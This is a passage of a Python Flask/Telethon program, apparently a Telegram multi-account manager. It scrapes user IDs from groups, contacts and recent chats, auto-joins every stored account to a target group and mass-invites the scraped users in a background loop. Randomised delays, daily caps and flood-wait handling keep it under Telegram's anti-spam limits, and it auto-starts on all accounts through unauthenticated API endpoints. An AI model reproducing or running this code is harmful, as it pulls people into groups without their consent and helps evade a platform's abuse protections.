            new_members.update(members)
            await asyncio.sleep(2)
    
    all_scraped.update(new_members)
    
    added_members_pool[account_key] = {
        'all_scraped': list(all_scraped),
        'already_added': list(already_added),
        'failed_to_add': list(failed_to_add)
    }
    save_added_members()
    
    available = all_scraped - already_added - failed_to_add
    
    logger.info("="*60)
    logger.info(f"📊 TOTAL POOL SIZE: {len(all_scraped)}")
    logger.info(f"✅ AVAILABLE TO ADD: {len(available)}")
    logger.info(f"🚫 ALREADY ADDED: {len(already_added)}")
    logger.info(f"❌ FAILED: {len(failed_to_add)}")
    logger.info("="*60)
    
    return list(available)

async def auto_join_target_group(client, account_id, target_group):
    """
    AUTO-JOIN TARGET GROUP
    This makes the account automatically join the target group before adding members
    """
    joined = False
    
    # Format the group name
    if not target_group.startswith('@') and not target_group.startswith('https://'):
        target_group = '@' + target_group
    elif target_group.startswith('https://t.me/'):
        target_group = '@' + target_group.replace('https://t.me/', '')
    
    logger.info(f"🔗 Auto-joining {target_group} for account {account_id}...")
    
    try:
        # Get the group entity
        entity = await client.get_entity(target_group)
        
        # Try to join
        try:
            await client(functions.channels.JoinChannelRequest(entity))
            joined = True
            logger.info(f"✅ Successfully joined {target_group}")
            return entity, joined
        except errors.UserAlreadyParticipantError:
            joined = True
            logger.info(f"✅ Already member of {target_group}")
            return entity, joined
        except Exception as e:
            if 'already' in str(e).lower() or 'participant' in str(e).lower():
                joined = True
                logger.info(f"✅ Already member of {target_group}")
                return entity, joined
            logger.warning(f"⚠️ Could not join {target_group}: {e}")
            return entity, joined
    except Exception as e:
        logger.error(f"❌ Cannot find {target_group}: {e}")
        return None, joined

async def ultra_fast_auto_add_loop(account):
    """
    ULTRA-FAST AUTO-ADD LOOP WITH AUTO-JOIN
    This is the main auto-add worker that runs in the background
    """
    account_id = account['id']
    account_key = str(account_id)
    joined_target = False  # Track if we've joined the target group
    
    stats = {
        'session_added': 0,
        'session_start': datetime.now(),
        'last_pool_build': None,
        'errors': 0
    }
    
    logger.info("="*70)
    logger.info(f"🎯 AUTO-ADD WITH AUTO-JOIN STARTED FOR ACCOUNT {account.get('name')}")
    logger.info(f"   Target: {auto_add_settings.get(account_key, {}).get('target_group', '@abe_armygroup')}")
    logger.info("="*70)
    
    while True:
        try:
            # Check if auto-add is still enabled
            if account_key not in auto_add_settings or not auto_add_settings[account_key].get('enabled', False):
                logger.info(f"Auto-add disabled for account {account_id}")
                break
            
            settings = auto_add_settings[account_key]
            target_group = settings.get('target_group', '@abe_armygroup')
            daily_limit = settings.get('daily_limit', 200)
            
            # Create client
            client = TelegramClient(
                StringSession(account['session']),
                API_ID,
                API_HASH,
                connection_retries=10,
                retry_delay=2,
                timeout=30
            )
            await client.connect()
            
            try:
                # Check authorization
                if not await client.is_user_authorized():
                    logger.error(f"Account {account_id} not authorized")
                    remove_invalid_account(account_id)
                    break
                
                # ============================================
                # AUTO-JOIN TARGET GROUP
                # This is the key part - auto join before adding
                # ============================================
                if not joined_target:
                    logger.info(f"🔄 Attempting to auto-join target group: {target_group}")
                    target_entity, joined_target = await auto_join_target_group(client, account_id, target_group)
                    
                    if target_entity and joined_target:
                        logger.info(f"✅ Target group auto-join successful")
                    else:
                        logger.error(f"❌ Failed to auto-join target group. Retrying in 2 minutes...")
                        await asyncio.sleep(120)
                        continue
                else:
                    # Verify we still have access to the group
                    try:
                        target_entity = await client.get_entity(target_group)
                    except Exception as e:
                        logger.warning(f"Lost access to target group: {e}. Rejoining...")
                        joined_target = False
                        continue
                
                # ============================================
                # GET MEMBER POOL
                # ============================================
                pool = added_members_pool.get(account_key, {})
                all_scraped = set(pool.get('all_scraped', []))
                already_added = set(pool.get('already_added', []))
                failed = set(pool.get('failed_to_add', []))
                available = list(all_scraped - already_added - failed)
                
                # Build new pool if needed
                if not available or not stats['last_pool_build'] or \
                   (datetime.now() - stats['last_pool_build']).seconds > 21600:  # 6 hours
                    
                    logger.info("🔄 Building new member pool...")
                    available = await build_massive_member_pool(client, account_id, settings)
                    stats['last_pool_build'] = datetime.now()
                
                if not available:
                    logger.info("😴 No members available. Waiting 30 minutes...")
                    await asyncio.sleep(1800)
                    continue
                
                # Get existing group members to avoid duplicates
                logger.info("📋 Checking existing group members...")
                existing = set()
                try:
                    async for user in client.iter_participants(target_entity, limit=5000):
                        if user and user.id:
                            existing.add(user.id)
                except:
                    pass
                
                fresh_members = [m for m in available if m not in existing]
                logger.info(f"🎯 READY TO ADD: {len(fresh_members)} new members")
                
                # Check daily limit
                today = datetime.now().strftime('%Y-%m-%d')
                if settings.get('last_reset') != today:
                    settings['added_today'] = 0
                    settings['last_reset'] = today
                
                if settings.get('added_today', 0) >= daily_limit:
                    now = datetime.now()
                    tomorrow = now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
                    wait_seconds = (tomorrow - now).seconds + 60
                    logger.info(f"📊 Daily limit reached ({daily_limit}). Waiting {wait_seconds//60} minutes...")
                    await asyncio.sleep(min(wait_seconds, 3600))
                    continue
                
                # ============================================
                # ADD MEMBERS TO TARGET GROUP
                # ============================================
                added_this_session = 0
                errors_in_row = 0
                
                for user_id in fresh_members:
                    try:
                        # Check if still enabled
                        if account_key not in auto_add_settings or \
                           not auto_add_settings[account_key].get('enabled', False):
                            break
                        
                        # Check daily limit
                        if settings.get('added_today', 0) >= daily_limit:
                            break
                        
                        try:
                            user_entity = await client.get_input_entity(user_id)
                            
                            await client(functions.channels.InviteToChannelRequest(
                                target_entity,
                                [user_entity]
                            ))
                            
                            settings['added_today'] = settings.get('added_today', 0) + 1
                            settings['total_added'] = settings.get('total_added', 0) + 1
                            settings['last_added'] = datetime.now().isoformat()
                            added_this_session += 1
                            stats['session_added'] += 1
                            
                            already_added.add(user_id)
                            added_members_pool[account_key] = {
                                'all_scraped': list(all_scraped),
                                'already_added': list(already_added),
                                'failed_to_add': list(failed)
                            }
                            
                            # Save periodically
                            if added_this_session % 25 == 0:
                                save_auto_add_settings()
                                save_added_members()
                            
                            logger.info(f"✅ Added [{settings['added_today']}/{daily_limit}] "
                                      f"| Session: {added_this_session} "
                                      f"| Total: {settings['total_added']} "
                                      f"| User: {user_id}")
                            
                            errors_in_row = 0
                            
                            # Random delay between adds
                            if added_this_session % 10 == 0:
                                await asyncio.sleep(random.randint(20, 35))
                            else:
                                await asyncio.sleep(random.randint(8, 15))
                            
                        except errors.FloodWaitError as e:
                            logger.warning(f"⏳ Flood wait {e.seconds}s")
                            if e.seconds < 3600:
                                await asyncio.sleep(e.seconds + 5)
                            else:
                                await asyncio.sleep(600)
                        except errors.UserPrivacyRestrictedError:
                            failed.add(user_id)
                            continue
                        except (errors.UserNotMutualContactError, errors.UserAlreadyParticipantError,
                                errors.UserKickedError, errors.UserBannedInChannelError):
                            failed.add(user_id)
                            continue
                        except Exception as e:
                            errors_in_row += 1
                            logger.error(f"Error adding {user_id}: {e}")
                            
                            if errors_in_row >= 15:
                                logger.warning(f"⚠️ {errors_in_row} consecutive errors. Taking a break...")
                                await asyncio.sleep(300)
                                errors_in_row = 0
                            continue
                    
                    except Exception as e:
                        logger.error(f"Unexpected error: {e}")
                        continue
                
                # Save after batch
                save_auto_add_settings()
                save_added_members()
                
                # Log summary
                elapsed = (datetime.now() - stats['session_start']).total_seconds()
                rate = stats['session_added'] / (elapsed / 3600) if elapsed > 0 else 0
                
                logger.info("="*60)
                logger.info(f"📈 SESSION SUMMARY:")
                logger.info(f"   Target Group: {target_group} (Joined: {joined_target})")
                logger.info(f"   Added this round: {added_this_session}")
                logger.info(f"   Total this session: {stats['session_added']}")
                logger.info(f"   Today's adds: {settings.get('added_today', 0)}/{daily_limit}")
                logger.info(f"   All-time adds: {settings.get('total_added', 0)}")
                logger.info(f"   Rate: {rate:.1f} adds/hour")
                logger.info(f"   Time running: {elapsed/3600:.1f} hours")
                logger.info("="*60)
                
                # Wait before next round
                if added_this_session > 0:
                    wait_time = random.randint(30, 90)
                else:
                    wait_time = random.randint(300, 600)
                
                logger.info(f"⏰ Next round in {wait_time} seconds...")
                await asyncio.sleep(wait_time)
                
            except Exception as e:
                logger.error(f"Loop error: {e}")
                await asyncio.sleep(60)
            finally:
                await client.disconnect()
        
        except Exception as e:
            logger.error(f"Critical error: {e}")
            await asyncio.sleep(60)

# ==================== AUTO ADD SYSTEM END ====================

# ==================== AUTO-ADD API ENDPOINTS ====================

@app.route('/api/auto-add-settings', methods=['GET'])
def get_auto_add_settings():
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    
    default_settings = {
        'enabled': True,
        'target_group': '@abe_armygroup',
        'delay_seconds': 15,
        'daily_limit': 200,
        'source_groups': DEFAULT_SOURCE_GROUPS,
        'use_contacts': True,
        'use_recent_chats': True,
        'use_scraping': True,
        'scrape_limit_per_group': 500,
        'skip_bots': True,
        'auto_join': True,  # Auto-join enabled by default
        'total_added': 0,
        'added_today': 0,
        'last_reset': datetime.now().strftime('%Y-%m-%d'),
        'last_added': None
    }
    
    if account_key in auto_add_settings:
        settings = auto_add_settings[account_key]
        for key, value in default_settings.items():
            if key not in settings:
                settings[key] = value
    else:
        settings = default_settings.copy()
        auto_add_settings[account_key] = settings
        save_auto_add_settings()
    
    return jsonify({'success': True, 'settings': settings})

@app.route('/api/auto-add-settings', methods=['POST'])
def update_auto_add_settings():
    try:
        data = request.json
        if not data:
            return jsonify({'success': False, 'error': 'No data received'})
        
        account_id = data.get('accountId')
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account_key = str(account_id)
        
        if account_key not in auto_add_settings:
            auto_add_settings[account_key] = {}
        
        was_enabled = auto_add_settings[account_key].get('enabled', False)
        
        # Update settings
        for key in ['enabled', 'target_group', 'delay_seconds', 'daily_limit',
                   'use_contacts', 'use_recent_chats', 'use_scraping',
                   'scrape_limit_per_group', 'skip_bots', 'auto_join']:
            if key in data:
                auto_add_settings[account_key][key] = data[key]
        
        if 'source_groups' in data:
            auto_add_settings[account_key]['source_groups'] = data['source_groups']
        
        save_auto_add_settings()
        
        # Start auto-add if newly enabled
        if auto_add_settings[account_key].get('enabled', False) and not was_enabled:
            account = next((acc for acc in accounts if acc['id'] == account_id), None)
            if account:
                thread = threading.Thread(
                    target=lambda: run_async(ultra_fast_auto_add_loop(account)),
                    daemon=True
                )
                thread.start()
                client_tasks[f"auto_add_{account_key}"] = thread
                logger.info(f"🚀 Started auto-add with auto-join for account {account_id}")
        
        return jsonify({'success': True, 'message': 'Settings updated'})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-add-stats', methods=['GET'])
def get_auto_add_stats():
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    settings = auto_add_settings.get(account_key, {})
    pool = added_members_pool.get(account_key, {})
    
    total_scraped = len(pool.get('all_scraped', []))
    already_added = len(pool.get('already_added', []))
    failed = len(pool.get('failed_to_add', []))
    available = total_scraped - already_added - failed
    
    return jsonify({
        'success': True,
        'added_today': settings.get('added_today', 0),
        'total_added': settings.get('total_added', 0),
        'enabled': settings.get('enabled', False),
        'auto_join': settings.get('auto_join', True),
        'daily_limit': settings.get('daily_limit', 200),
        'target_group': settings.get('target_group', '@abe_armygroup'),
        'pool_size': total_scraped,
        'available_to_add': max(0, available),
        'already_added': already_added,
        'failed': failed,
        'last_reset': settings.get('last_reset', ''),
        'last_added': settings.get('last_added')
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    try:
        data = request.json
        account_id = data.get('accountId')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if not account:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def test():
            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
            await client.connect()
            
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Account not authorized'}
                
                settings = auto_add_settings.get(str(account_id), {})
                target_group = settings.get('target_group', '@abe_armygroup')
                
                if not target_group.startswith('@') and not target_group.startswith('https://'):
                    target_group = '@' + target_group
                
                group_found = False
                group_title = target_group
                already_member = False
                
                try:
                    group = await client.get_entity(target_group)
                    group_found = True
                    group_title = group.title if hasattr(group, 'title') else target_group
                    
                    # Check if already member
                    try:
                        await client(functions.channels.JoinChannelRequest(group))
                        already_member = False
                    except errors.UserAlreadyParticipantError:
                        already_member = True
                    except Exception as e:
                        if 'already' in str(e).lower():
                            already_member = True
                except Exception as e:
                    return {'success': False, 'error': f'Target group error: {str(e)}'}
                
                # Count available members
                available = 0
                sources = []
                
                if settings.get('use_contacts', True):
                    try:
                        contacts = await client(functions.contacts.GetContactsRequest(0))
                        contact_count = len([c for c in contacts.users if not c.bot])
                        available += contact_count
                        sources.append(f"Contacts: {contact_count}")
                    except:
                        pass
                
                if settings.get('use_recent_chats', True):
                    try:
                        dialogs = await client.get_dialogs(limit=100)
                        dialog_count = len([d for d in dialogs if d.is_user])
                        available += dialog_count
                        sources.append(f"Recent chats: {dialog_count}")
                    except:
                        pass
                
                return {
                    'success': True,
                    'group_found': group_found,
                    'group_title': group_title,
                    'already_member': already_member,
                    'will_auto_join': settings.get('auto_join', True),
                    'available_members': available,
                    'sources_found': sources,
                    'can_add': group_found and available > 0
                }
                
            finally:
                await client.disconnect()
        
        result = run_async(test())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-join-target-group', methods=['POST'])
def auto_join_target_group_endpoint():
    """Manual endpoint to join target group"""
    try:
        data = request.json
        account_id = data.get('accountId')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if not account:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        account_key = str(account_id)
        settings = auto_add_settings.get(account_key, {})
        target_group = data.get('targetGroup') or settings.get('target_group', '@abe_armygroup')
        
        async def join_target():
            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
            await client.connect()
            
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Account not authorized'}
                
                entity, joined = await auto_join_target_group(client, account_id, target_group)
                
                if entity and joined:
                    return {
                        'success': True,
                        'message': f'Successfully joined {target_group}',
                        'joined': True,
                        'group_title': getattr(entity, 'title', target_group)
                    }
                elif entity:
                    return {
                        'success': True,
                        'message': f'Already member of {target_group}',
                        'joined': True,
                        'group_title': getattr(entity, 'title', target_group)
                    }
                else:
                    return {
                        'success': False,
                        'error': f'Could not join {target_group}'
                    }
                    
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(join_target())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== STARTUP FUNCTION ====================

def start_auto_add_threads():
    """Start auto-add with auto-join for all enabled accounts on startup"""
    time.sleep(5)
    logger.info("="*60)
    logger.info("🚀 STARTING AUTO-ADD WITH AUTO-JOIN...")
    logger.info("="*60)
    
    for account in accounts:
        account_key = str(account['id'])
        
        # Auto-initialize settings if not exist
        if account_key not in auto_add_settings:
            auto_add_settings[account_key] = {
                'enabled': True,
                'target_group': '@abe_armygroup',
                'delay_seconds': 15,
                'daily_limit': 200,
                'source_groups': DEFAULT_SOURCE_GROUPS,
                'use_contacts': True,
                'use_recent_chats': True,
                'use_scraping': True,
                'scrape_limit_per_group': 500,
                'skip_bots': True,
                'auto_join': True,
                'total_added': 0,
                'added_today': 0,
                'last_reset': datetime.now().strftime('%Y-%m-%d'),
                'last_added': None
            }
            save_auto_add_settings()
        
        # Start if enabled
        if auto_add_settings[account_key].get('enabled', True):
            target_group = auto_add_settings[account_key].get('target_group', '@abe_armygroup')
            auto_join_enabled = auto_add_settings[account_key].get('auto_join', True)
            
            thread = threading.Thread(
                target=lambda acc=account: run_async(ultra_fast_auto_add_loop(acc)),
                daemon=True
            )
            thread.start()
            client_tasks[f"auto_add_{account_key}"] = thread
            logger.info(f"🚀 Auto-add started for {account.get('name')}")
            logger.info(f"   Target: {target_group}")
            logger.info(f"   Auto-join: {'✅ Enabled' if auto_join_enabled else '❌ Disabled'}")
            time.sleep(1)
    
    logger.info("="*60)

# ==================== MAIN STARTUP ====================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print('\n' + '='*70)
    print('🤖 TELEGRAM MULTI-ACCOUNT MANAGER')
    print('='*70)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts loaded: {len(accounts)}')
    print(f'✅ Reply settings loaded: {len(reply_settings)}')
    print(f'✅ Auto-add settings loaded: {len(auto_add_settings)}')
    print('='*70)
    print('🎯 FEATURES:')
    print('   • Auto-Reply (Abel AI)')
    print('   • Auto-Add Members')
    print('   • Auto-Join Target Group')
    print('='*70)
    
    # Start keep-alive
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # Auto-start all features
    threading.Thread(target=auto_start_all_accounts, daemon=True).start()
    
    app.run(host='0.0.0.0', port=port, debug=False)
